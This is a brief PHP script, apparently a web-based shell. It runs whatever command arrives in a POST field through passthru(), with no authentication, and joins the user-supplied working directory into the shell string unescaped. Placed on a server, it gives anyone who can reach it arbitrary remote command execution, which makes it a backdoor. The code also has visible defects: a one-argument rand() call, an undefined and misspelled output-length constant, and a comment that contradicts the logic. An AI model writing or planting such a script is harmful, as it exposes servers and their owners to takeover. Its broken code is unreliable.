
<?php
$unique = "bshelltmp_".md5(rand(1000).date("YmdHis"));
$tmp = sys_get_temp_dir(); // on cloud servers we prefer the NFS than a different /tmp/ for every submit.
$tmppwd = $tmp."/".$unique."_pwd.txt";
$tmpoutput = $tmp."/".$unique."_output.txt";
$pwd = $_POST['pwd'];
if(!empty($_POST['cmd']))
{
	echo "start";
	$cmd = stripslashes($_POST['cmd']);
	passthru('cd '.$pwd.' && echo "<hr/>">> '.$tmpoutput.' && echo '.$pwd.'$ '.escapeshellarg($cmd).' >> '.$tmpoutput.' && echo >> '.$tmpoutput.' && '.$cmd .' >> '.$tmpoutput.' 2>&1 && pwd > '.$tmppwd);
	$newpwd = trim(file_get_contents($tmppwd)); //capture new Present (current) Working Directory just in case it changed
	$pwd = $newpwd; //if something failed, don't change directory
	echo(file_get_contents($tmpoutput, false, NULL, filesize($tmpoutput)-MAX_OUTPUT_LENGHT));
	unlink($tmppwd);
}
?>
